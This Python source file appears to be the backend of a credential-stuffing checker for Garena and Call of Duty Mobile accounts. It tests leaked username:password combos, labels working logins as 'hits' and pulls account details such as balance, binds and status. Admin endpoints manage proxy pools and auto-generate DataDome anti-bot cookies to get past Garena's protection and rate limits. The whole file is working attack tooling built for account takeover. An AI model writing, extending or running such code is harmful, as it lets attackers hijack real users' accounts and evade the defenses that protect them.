            if any(e in err_type for e in ("error_auth", "error_no_account", "error_security_ban")):
                return CheckOneResponse(combo=combo, status="bad",
                    detail=f"Account error: {err_type}")

        acc = _parse_account(info) if info else _EMPTY_ACC

        access_token = _codm_token_new(session, sso_key)
        old_flow = False
        if not access_token:
            access_token = _codm_token_old(session)
            old_flow = True

        def _valid_no_codm(detail: str) -> CheckOneResponse:
            return CheckOneResponse(
                combo=combo, status="valid_no_codm", detail=detail,
                shell=acc["shell"], country=acc["country"],
                is_clean=acc["is_clean"], binds=acc.get("binds", []),
                uid=acc.get("uid", ""), username=acc.get("username", ""),
                account_status=acc.get("account_status", ""),
                security_status=acc.get("security_status", ""),
                suspicious=acc.get("suspicious", False),
            )

        if not access_token:
            return _valid_no_codm("Valid Garena — CODM token failed")

        cb = _codm_callback(session, access_token, old_flow=old_flow)
        if not cb or cb.get("status") == "no_codm":
            return _valid_no_codm("Valid Garena — No CODM linked")

        user = _codm_user_info(session, cb["token"], old_flow=old_flow)
        return CheckOneResponse(
            combo=combo, status="hit",
            nickname=str(user.get("codm_nickname") or user.get("nickname") or acc.get("nickname", "")),
            level=str(user.get("codm_level") or ""),
            region=str(user.get("region") or ""),
            uid=str(user.get("uid") or acc.get("uid", "")),
            shell=acc["shell"], country=acc["country"],
            is_clean=acc["is_clean"], binds=acc.get("binds", []),
            account_status=acc.get("account_status", ""),
            security_status=acc.get("security_status", ""),
            suspicious=acc.get("suspicious", False),
            username=acc.get("username", ""),
            detail="HIT",
        )

    except Exception as e:
        logger.error(f"CODM check error for {account}: {e}")
        return CheckOneResponse(combo=combo, status="error", detail=f"Server error: {str(e)[:120]}")
    finally:
        try:
            session.close()
        except Exception:
            pass


# ── Admin — Cookie pool endpoints ─────────────────────────────

@router.get("/cookies", dependencies=[Depends(require_admin)])
async def get_cookies():
    cookies = _get_all_cookies()
    return {"count": len(cookies),
            "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
            "cookies": cookies}

@router.post("/cookies", dependencies=[Depends(require_admin)])
async def set_cookies(req: CookieUpdateRequest):
    cleaned = [l.strip() for l in req.cookies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid cookie lines provided")
    if not _redis_set_list(_REDIS_KEY_COOKIES, cleaned):
        raise HTTPException(500, "Failed to save cookies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}

@router.delete("/cookies", dependencies=[Depends(require_admin)])
async def delete_cookies():
    _redis_del(_REDIS_KEY_COOKIES)
    return {"message": "✅ Cookie pool cleared"}

@router.post("/cookies/generate", dependencies=[Depends(require_admin)])
async def generate_datadome():
    """Auto-generates a fresh DataDome via dd.garena.com and saves to pool."""
    if not _HAS_CLOUDSCRAPER:
        raise HTTPException(503, "cloudscraper not installed")
    fresh = _auto_generate_datadome()
    if not fresh:
        raise HTTPException(500, "Failed to auto-generate DataDome — Garena may have changed their API")
    _save_fresh_cookie_to_redis(fresh)
    return {
        "message":   "✅ Fresh DataDome generated and saved to pool",
        "pool_size": len(_get_all_cookies()),
        "preview":   fresh[:30] + "..." if len(fresh) > 30 else fresh,
    }


# ── Admin — Proxy pool endpoints ──────────────────────────────

@router.get("/proxies", dependencies=[Depends(require_admin)])
async def get_proxies():
    return {"count": len(_get_all_proxies()), "proxies": _get_all_proxies()}

@router.post("/proxies", dependencies=[Depends(require_admin)])
async def set_proxies(req: ProxyUpdateRequest):
    cleaned = [l.strip() for l in req.proxies if l.strip()]
    if not cleaned:
        raise HTTPException(400, "No valid proxy lines provided")
    if not _redis_set_list(_REDIS_KEY_PROXIES, cleaned):
        raise HTTPException(500, "Failed to save proxies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}

@router.delete("/proxies", dependencies=[Depends(require_admin)])
async def delete_proxies():
    _redis_del(_REDIS_KEY_PROXIES)
    return {"message": "✅ Proxy pool cleared"}


# ── Admin — Debug cookie test ──────────────────────────────────

@router.get("/debug-cookie", dependencies=[Depends(require_admin)])
async def debug_cookie():
    """Tests up to 5 cookies in the pool against Garena prelogin."""
    if not _HAS_CLOUDSCRAPER:
        raise HTTPException(503, "cloudscraper not installed")
    cookies = _get_all_cookies()
    if not cookies:
        return {
            "status":  "no_cookies",
            "message": (
                "⚠️ No DataDome cookies. "
                "Use POST /api/codm/cookies/generate to auto-generate one."
            ),
        }
    results = []
    for i, raw in enumerate(cookies[:5]):
        dd_val = _extract_dd_value(raw)
        sess = _make_session(dd_val)
        try:
            ts = int(time.time() * 1000)
            hdr = {"Accept": "application/json", "Host": _PRELOGIN_HOST,
                   "User-Agent": _UA_NEW, "X-Requested-With": "com.garena.game.codm"}
            if dd_val:
                hdr["Cookie"] = f"datadome={dd_val}"
            res = sess.get(_PRELOGIN_URL, headers=hdr,
                params={"app_id": "100082", "account": "debug_test@garena.com",
                        "format": "json", "id": str(ts)}, timeout=10)
            try:
                body = res.json()
            except Exception:
                body = {"raw": res.text[:200]}
            if res.status_code == 403:
                verdict = "❌ BLOCKED"
            elif res.status_code == 200 and "error" in body:
                err = str(body.get("error", "")).lower()
                verdict = ("✅ VALID (account not found = cookie works)"
                           if any(k in err for k in ("not_exist", "not_found", "no_account"))
                           else f"⚠️ GARENA ERROR: {err}")
            elif res.status_code == 200 and "v1" in body:
                verdict = "✅ VALID (got v1/v2)"
            else:
                verdict = f"⚠️ HTTP {res.status_code}: {str(body)[:80]}"
            results.append({"index": i + 1, "verdict": verdict, "http": res.status_code})
        except Exception as e:
            results.append({"index": i + 1, "verdict": f"❌ EXCEPTION: {str(e)[:100]}", "http": None})
        finally:
            try:
                sess.close()
            except Exception:
                pass

    valid   = sum(1 for r in results if "✅" in r["verdict"])
    blocked = sum(1 for r in results if "❌" in r["verdict"])
    return {
        "total_in_pool": len(cookies), "tested": len(results),
        "valid": valid, "blocked": blocked, "results": results,
        "advice": (
            "✅ All tested cookies are valid" if blocked == 0
            else f"⚠️ {blocked} cookie(s) blocked — use POST /api/codm/cookies/generate"
        ),
    }


# ── Main endpoint ─────────────────────────────────────────────

@router.post("/check-one", response_model=CheckOneResponse)
async def check_one(req: CheckOneRequest):
    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
        return CheckOneResponse(combo=req.combo, status="error",
            detail="Server missing deps: cloudscraper or pycryptodome.")
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_executor, _do_check_sync, req),
            timeout=55.0,
        )
    except asyncio.TimeoutError:
        logger.warning(f"check-one timeout: {req.combo[:30]}")
        return CheckOneResponse(combo=req.combo, status="error",
            detail="Server timeout (55s) — Garena rate-limiting. Try proxy.")
